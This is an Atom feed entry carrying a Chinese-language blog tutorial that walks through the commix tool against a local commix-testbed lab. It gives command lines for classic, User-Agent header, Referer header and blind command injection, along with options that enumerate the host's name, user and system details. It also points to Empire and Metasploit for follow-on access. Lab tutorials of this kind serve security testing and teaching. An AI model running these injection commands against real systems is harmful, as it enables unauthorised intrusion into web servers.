  <entry>
    <title>commix-系统命令注入自动化测试实例</title>
    <link href="http://zer0yu.github.io/2017/01/21/commix-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/"/>
    <id>http://zer0yu.github.io/2017/01/21/commix-系统命令注入自动化测试实例/</id>
    <published>2017-01-21T13:14:09.000Z</published>
    <updated>2017-01-21T13:31:04.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h4><p>​    commix是一款很好用的命令注入的工具，前几天看了看国内对其的介绍和使用示例挺少的，所以最近有空就写了这一篇文章来列举几个使用的栗子。</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>​    命令注入就是部分Web应用程序提供了一些命令执行的操作，那么在Web应用程序底层去调用系统操作命令时，如果没有过滤好用户输入的数据，就很有可能形成系统命令执行漏洞来直接执行操作系统命令。详细讲解参考<a href="https://www.owasp.org/index.php/Command_Injection" target="_blank" rel="noopener">Command Injection</a></p><h4 id="commix简介"><a href="#commix简介" class="headerlink" title="commix简介"></a>commix简介</h4><p>​    此处就不详细介绍了如果想要了解可以看这两篇文章：</p><p>​    <a href="http://www.mottoin.com/91981.html" target="_blank" rel="noopener">http://www.mottoin.com/91981.html</a></p><p>​    <a href="http://www.mottoin.com/91806.html" target="_blank" rel="noopener">http://www.mottoin.com/91806.html</a></p><h4 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h4><p>​    在这里你可以使用DVWA或者DWAPP来实战，当然我觉得要尽可能全的包含各种类型的命令注入漏洞才算完美所以我们在此处使用commix提供的一个测试平台<a href="https://github.com/commixproject/commix-testbed" target="_blank" rel="noopener">commix-testbed</a>。</p><p>1.如果你在使用windows平台那么我推荐<a href="http://www.phpstudy.net/" target="_blank" rel="noopener">PHPStudy</a>来搭建环境</p><p>安装完成后你只需要在phpstudy的www目录下打开cmd键入：</p><p><code>git clone https://github.com/commixproject/commix-testbed.git</code></p><p>(当然你要确保你安装了Git)</p><p>之后只要启动phpstudy就可以在浏览器中访问了</p><p>2.如果你使用的是Linux或者MacOS平台我推荐用xampp来搭建环境</p><p>搭建好之后你就可以看到如下界面</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-1.png" alt="1"></p><p>环境搭建好后我们来进行渗透测试</p><h4 id="示例一：Results-based命令注入攻击"><a href="#示例一：Results-based命令注入攻击" class="headerlink" title="示例一：Results-based命令注入攻击"></a>示例一：Results-based命令注入攻击</h4><p>我们选择GET方式的Classic regular example</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-2.png" alt="2"></p><p>ping下127.0.0.1试下</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-3.png" alt="3"></p><p>复制url并打开commix开始hack</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-4.png" alt="4"></p><p>渗透主机为win后期可以借助empire（不知道empire？？？没关系<a href="http://www.mottoin.com/?s=empire" target="_blank" rel="noopener">戳我</a>）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-5.png" alt="5"></p><p>可以使用</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/classic.php?addr=127.0.0.1&quot; --hostname --current-user --sys-info</code></p><p>含义：显示当前测试主机的主机名，用户名和系统信息</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-8.png" alt="8"></p><p>如果渗透主机为Linux则后期可以借助msf(不会msf？？？没关系<a href="http://www.mottoin.com/18517.html" target="_blank" rel="noopener">戳我</a>)</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-9.png" alt="9"></p><h4 id="示例二：User-Agent-HTTP头注入攻击"><a href="#示例二：User-Agent-HTTP头注入攻击" class="headerlink" title="示例二：User-Agent HTTP头注入攻击"></a>示例二：User-Agent HTTP头注入攻击</h4><p>选择User-Agent HTTP Header中的第一个Classic user-agent-based example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php</code></p><p>然后开始使用commix注入：</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot;</code></p><p>含义：post参数addr=192.168.1.121并指定要使用的进样技术</p><p>效果如下：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-10.png" alt="10"></p><h4 id="示例三：Referer-HTTP头注入攻击"><a href="#示例三：Referer-HTTP头注入攻击" class="headerlink" title="示例三：Referer HTTP头注入攻击"></a>示例三：Referer HTTP头注入攻击</h4><p>选择Referer HTTP Header中的第一个Classic referer-based example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php</code></p><p>然后开始使用commix注入：</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot;</code></p><p>和上面的差不多不解释了</p><p>效果如下：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-11.png" alt="11"></p><h4 id="示例四：Blind-命令注入攻击"><a href="#示例四：Blind-命令注入攻击" class="headerlink" title="示例四：Blind 命令注入攻击"></a>示例四：Blind 命令注入攻击</h4><p>选择Regular (GET / POST)中的Blind regular example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1</code></p><p>然后开始使用commix注入：</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1&quot; --technique=&quot;tf&quot; -v 1</code></p><p>效果如下：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-12.png" alt="12"></p><p>执行命令：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-13.png" alt="13"></p><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>上面的例子不是很全，有几个使用commix进行命令注入的视频，有兴趣可以下载看下</p><p>链接: <a href="https://pan.baidu.com/s/1qXMNjZm" target="_blank" rel="noopener">https://pan.baidu.com/s/1qXMNjZm</a> 密码: 5peb</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/commixproject/commix-testbed" target="_blank" rel="noopener">https://github.com/commixproject/commix-testbed</a></p><p><a href="https://github.com/commixproject/commix" target="_blank" rel="noopener">https://github.com/commixproject/commix</a></p><p><a href="http://www.commixproject.com/" target="_blank" rel="noopener">http://www.commixproject.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h4&gt;&lt;p&gt;​    commix是一款很好用的命令注入的工具，前几天看了看国内对其的介绍和使用示例挺少的，所以最近有空就写了这一篇文章来列举几个使用的
      
    
    </summary>
    
    
  </entry>
  
</feed>
